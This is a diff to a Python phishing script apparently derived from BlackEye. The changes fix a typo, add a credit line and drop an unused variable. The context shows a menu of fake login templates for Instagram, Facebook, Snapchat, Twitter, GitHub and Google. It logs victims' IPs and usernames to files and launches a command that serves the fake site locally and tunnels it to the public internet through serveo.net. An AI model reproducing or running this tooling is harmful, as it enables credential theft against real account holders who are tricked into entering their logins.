@@ -22,7 +22,8 @@ def run():
 
     try:
         print("""
-                        Availble Templates
+    Credit to @thelinuxchoice for BlackEye's base sites.
+                        Available Templates
 
     [1] Instagram          [2] Facebook            [3] Snapchat
     [4] Twitter            [5] GitHub              [6] Google
@@ -87,7 +88,7 @@ def run():
         print("Logs Can Be Found In sites/%s/ip.txt and sites/%s/usernames.txt" % (choice, choice) + colors.END)
         cmd_line = "php -t sites/%s -S 127.0.0.1:80 & ssh -R %s.serveo.net:80:127.0.0.1:80 serveo.net" % (choice, subdom)
         p = subprocess.Popen(cmd_line, shell=True)
-        out = p.communicate()[0]
+        p.communicate()[0]
 
 
     except KeyboardInterrupt:
